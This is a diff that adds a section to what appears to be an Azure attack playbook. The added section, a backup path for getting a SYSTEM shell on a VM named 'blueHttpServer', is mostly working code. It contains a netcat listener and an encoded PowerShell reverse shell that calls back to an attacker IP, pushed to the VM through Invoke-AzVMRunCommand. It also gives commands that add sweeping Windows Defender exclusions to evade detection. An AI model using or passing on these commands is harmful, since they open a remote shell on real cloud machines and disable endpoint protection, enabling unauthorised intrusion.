@@ -278,6 +278,30 @@ Invoke-AzVMRunCommand -ResourceGroupName "RGCORPSERVERS" -VMName "blueHttpServer
   -CommandId "RunPowerShellScript" -ScriptString $lateral
 ```
 
+
+### 4e: NC Reverse Shell (Backup — May Get Flagged by Defender)
+
+If Tamper Protection is off or exclusions work in your environment, nc shell gives you an interactive SYSTEM prompt:
+
+```bash
+# On Kali:
+nc -lvnp 80
+```
+
+```powershell
+# Deploy reverse shell
+$script = '$s=[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes(''$c=New-Object System.Net.Sockets.TCPClient("YOUR_KALI_IP",80);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$sb=([text.encoding]::ASCII).GetBytes($r+"PS "+(gl).Path+"> ");$s.Write($sb,0,$sb.Length);$s.Flush()}'')); powershell -nop -w hidden -ep bypass -enc $s'
+
+Invoke-AzVMRunCommand -ResourceGroupName "RGCORPSERVERS" -VMName "blueHttpServer" `
+  -CommandId "RunPowerShellScript" -ScriptString $script -AsJob
+```
+
+> **Note**: If Defender flags this as `PUA:PowerShell/ReverseShell`, try setting exclusions first (only works if Tamper Protection is OFF):
+> ```powershell
+> $exc = 'Add-MpPreference -ExclusionPath "C:\"; Add-MpPreference -ExclusionProcess "*"; Add-MpPreference -ExclusionProcess "powershell.exe"'
+> Invoke-AzVMRunCommand -ResourceGroupName "RGCORPSERVERS" -VMName "blueHttpServer" -CommandId "RunPowerShellScript" -ScriptString $exc
+> ```
+
 ---
 
 ## Step 5: Verify Beacon
